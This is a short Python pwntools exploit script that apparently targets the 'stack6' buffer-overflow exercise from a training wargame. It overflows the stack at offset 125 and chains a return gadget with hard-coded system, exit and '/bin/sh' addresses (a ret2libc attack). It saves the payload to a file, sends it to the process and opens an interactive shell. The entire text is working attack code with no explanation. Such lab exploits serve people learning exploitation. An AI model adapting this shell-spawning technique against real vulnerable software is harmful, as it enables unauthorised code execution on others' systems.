from pwn import *

offset_ret = 125
ret_addr = 0x56555426
system_addr = 0xf7e4ada0
exit_addr = 0xf7e3e9d0
binsh_addr = 0xf7f6ba0b

exploit_str = flat({offset_ret:p32(ret_addr)},p32(system_addr),p32(exit_addr),p32(binsh_addr))

exploit_file = open('exploit.in', 'w')
exploit_file.write(exploit_str)

p = process('./stack6')
p.sendline(exploit_str)
p.interactive()
